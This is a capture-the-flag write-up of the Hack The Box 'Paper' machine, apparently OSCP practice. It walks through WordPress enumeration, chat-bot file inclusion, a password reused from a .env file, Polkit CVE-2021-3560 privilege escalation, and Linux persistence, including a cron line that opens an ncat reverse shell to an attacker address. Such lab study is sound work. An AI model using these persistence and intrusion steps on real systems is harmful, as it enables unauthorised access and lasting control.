
# Paper Writeup

Name: Paper
Date:  14/12/2022
Difficulty:  Easy
Goals:  OSCP Preparation
Learnt:
- Kick the head with the password reuse, because has always seemed alien to me 
- Run multiple Scripts and attempts of the same script

## Recon

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](HackTheBox/Retired-Machines/Paper/Screenshots/ping.png)

Nikto reveals a office.paper, add to /etc/host with:
```bash
echo "$ip office.paper" | sudo tee -a /etc/hosts
```
Made a mistake that cost me time which was to add .htb to the end. Positive positives. 

Feroxbuster directory busting reveals it is a wordpress site. The blundertiffin site:
![blundertiffin](Screenshots/blundertiffin.png)

```bash
wpscan --url -e --api-token $apikey -o $output-file
```

Then tried: [exploitdb](https://www.exploit-db.com/exploits/47690) for the sccret correspondence:
![secret](Screenshots/secret-wp.png)

Registering an account on the rocket.chat, seems like the box is american office themed. recyplops is a bot on the chat reading required: ![1000](Screenshots/recyclops.png)

Recyclops has directory traversal and file inclusion vulnerablity:

![one](Screenshots/recyclops-exp0.png)

After looking around I found credentials in the hubot/.env file

![creds](Screenshots/hubot-env.png)

![denied](denied-by-dwight.png)

`Queenofblad3s!23`

## Foothold

..but Dwight does use the same password for recyclops and himself:

![](same-password.png)

## PrivEsc
```bash
uname -a

Linux paper 4.18.0-348.7.1.el8_5.x86_64 #1 SMP Wed Dec 22 13:25:12 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
```


Linpeas highlighed 
![1000](badpath.png)

Amusing the creator of the box has Secnigma CVE-2021-3960, which failed to find...

![](cron.png)

![1000](interestingfiles.png)

## Returning to Root and Beyond Root

To keep my head sloshing with quality Privilege Escalation experiences while I am trying to get Cloud Certified and power on through these attempts. Furthermore Beyond Root for this box is a to play with the wordpress configuration and try three modern Linux Persistence techniques. I decided to [hack and chill with the Funday Sunday (title says Funday,but apparently its Nooby Tuesday)with Alh4zr3d](https://www.youtube.com/watch?v=QeJ4IcwD9ig) to mix up my day and to finish this. I will check 3 other writeups to check (they were all the same) for alternate route especially if Wordpress configuration is just me reading configuration files.  

Alh4zr3d uses the command injection to get a reverse shell. Amusing the creator of the box has Secnigma CVE-2021-3960, which failed to find... which did not show up in my Linpeas.sh even though it did for Al and I could run another Linux Exploit suggester script. No problem.. [Here we go](https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation) 
TL;DR - explaination of the exploit: race condition, where the exploitation beats check in polkit by sending and closing a request while polkit is still processing the request, because we are UID 0 at at the point we can write a new user and password in the wheel group (sudo group) so you can `sudo su` as that user to becom e root.

![](newroot.png)

## Wordpress configuration

Has a `.nmp` for the bot, dmiffinblog contain the wordpress site. I just read some of the files here to see what they did

## Linux Persistence

1. ssh key generation - https://attack.mitre.org/techniques/T1098/004
```bash
cat /etc/ssh/sshd_config
# configure to root to login
ssh-keygen 
chmod 600 id_rsa
```

1. cronjob 
```bash
(crontab -l ; echo "@reboot sleep 200 && ncat $REVADD 1337 -e /bin/bash")|crontab 2> /dev/null
```

3. reseached modern linux persistence

There is no desktop:
https://attack.mitre.org/techniques/T1547/013 - By default, XDG autostart entries are stored within the `/etc/xdg/autostart` or `~/.config/autostart` directories and have a .desktop file extension.

No systemd
https://attack.mitre.org/techniques/T1543/002 - Systemd service